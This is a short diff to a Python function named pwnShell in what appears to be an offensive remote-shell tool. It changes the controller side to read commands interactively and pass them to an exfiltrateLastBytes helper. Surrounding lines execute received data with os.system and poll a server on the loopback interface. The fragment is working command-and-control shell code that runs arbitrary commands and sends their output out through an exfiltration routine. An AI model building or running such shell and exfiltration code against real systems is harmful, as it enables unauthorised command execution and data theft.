@@ -116,7 +116,8 @@ def pwnShell(interface, mode, receiver):
             cmd = os.system(data)
             exfiltrateLastBytes(cmd, "127.0.0.1", "")
         else:
-            exfiltrateLastBytes("whoami", "127.0.0.1", "")
+            cmd = raw_input("> ")
+            exfiltrateLastBytes(cmd, "127.0.0.1", "")
             data = ""
             while data == "":
                 data = server("lo", 1)
